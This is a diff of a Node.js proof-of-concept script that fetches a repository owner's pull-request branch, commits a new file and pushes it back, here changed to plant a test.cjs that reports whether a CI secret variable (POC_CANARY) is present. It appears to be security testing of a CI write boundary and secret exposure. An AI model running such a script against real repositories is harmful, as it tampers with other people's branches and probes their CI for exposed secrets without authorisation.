@@ -17,15 +17,15 @@ function git(label, args) {
   return result.stdout.trim();
 }
 
-console.log("OUTSIDER_OWNER_PR_TAMPER_TEST_RAN_20261015");
+console.log("OUTSIDER_CI_CANARY_TEST_RAN_20261015");
 git("FETCH_OWNER_PR", ["fetch", remote, "refs/heads/" + branch]);
 git("CHECKOUT_OWNER_PR", ["checkout", "--detach", "FETCH_HEAD"]);
-writeFileSync("owned-pr-tamper-proof.txt", "Harmless outsider-write marker via owned Eve test on 2026-10-15.\n");
-git("STAGE_MARKER", ["add", "owned-pr-tamper-proof.txt"]);
-git("COMMIT_MARKER", [
+writeFileSync("test.cjs", 'console.log("CI_CANARY_PRESENT=" + Boolean(process.env.POC_CANARY));\n');
+git("STAGE_CANARY_TEST", ["add", "test.cjs"]);
+git("COMMIT_CANARY_TEST", [
   "-c", "user.name=Owned PoC",
   "-c", "user.email=owned-poc@example.invalid",
-  "commit", "-m", "Add harmless owner PR write-boundary marker",
+  "commit", "-m", "Add harmless CI canary presence check",
 ]);
 console.log("NEW_OWNER_PR_SHA=" + git("REV_PARSE", ["rev-parse", "HEAD"]));
 git("PUSH_OWNER_PR", ["push", remote, "HEAD:refs/heads/" + branch]);
